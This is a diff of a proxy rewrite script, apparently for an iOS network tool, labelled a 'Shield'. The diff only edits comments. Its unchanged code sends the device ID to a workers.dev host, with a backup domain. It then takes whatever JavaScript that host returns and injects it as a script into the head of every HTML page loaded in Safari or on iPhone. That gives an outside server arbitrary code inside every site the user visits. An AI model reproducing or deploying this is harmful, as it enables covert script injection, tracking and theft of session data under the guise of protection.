@@ -3,7 +3,6 @@
  * 作者：fiywind
  */
 
-
 const ua = $request.headers['User-Agent'] || $request.headers['user-agent'];
 const did = $environment.device_id;
 const urls = [
@@ -11,7 +10,7 @@ const urls = [
     `https://safari-shield-auth.justlcd.workers.dev/?id=${did}`
 ];
 
-// 1. 原版精准识别逻辑
+// 精准识别逻辑
 if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body && $response.body.includes("<head>")) {
     fetchShield(0);
 } else {
@@ -22,13 +21,13 @@ function fetchShield(idx) {
     if (idx >= urls.length) return $done({}); 
 
     $httpClient.get(urls[idx], (err, resp, data) => {
-        // 校验返回内容是否包含有效的脚本特征
+        // 校验：确保返回的是有效的 window 代码逻辑
         if (!err && resp.status === 200 && data.includes("window")) {
             let body = $response.body.replace("<head>", `<head><script>${data}</script>`);
             console.log("🛡️ Shield Activated via " + urls[idx]);
             $done({ body });
         } else {
-            // 第一域名失效（如 NXDOMAIN）自动尝试备选域名
+            // 第一域名失效则尝试备用
             fetchShield(idx + 1); 
         }
     });
